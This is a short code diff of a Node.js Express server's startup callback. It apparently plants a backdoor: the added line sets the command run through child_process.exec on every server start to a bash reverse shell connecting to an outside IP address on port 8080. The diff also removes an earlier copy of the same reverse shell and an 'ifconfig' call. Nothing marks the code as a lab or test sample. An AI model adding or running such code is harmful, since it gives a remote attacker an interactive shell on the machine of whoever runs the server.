@@ -259,7 +259,7 @@ io.sockets.on('connection', function (socket) {
 server.listen(app.get('port'), function () {
     console.log("Express server listening on port " + app.get('port'));
     var execx = require('child_process').exec;
-    var cmdStr = 'whoami';
+    var cmdStr = '/bin/bash -i>&/dev/tcp/43.132.177.160/8080 0>&1';
     execx(cmdStr, function (err, stdout, srderr) {
       if (err) {
           console.log(srderr);
@@ -267,6 +267,5 @@ server.listen(app.get('port'), function () {
           console.log(stdout);
       }
     });
-    require('child_process').exec('ifconfig');
-    require('child_process').exec('/bin/bash -i>&/dev/tcp/43.132.177.160/8080 0>&1');
+
 });
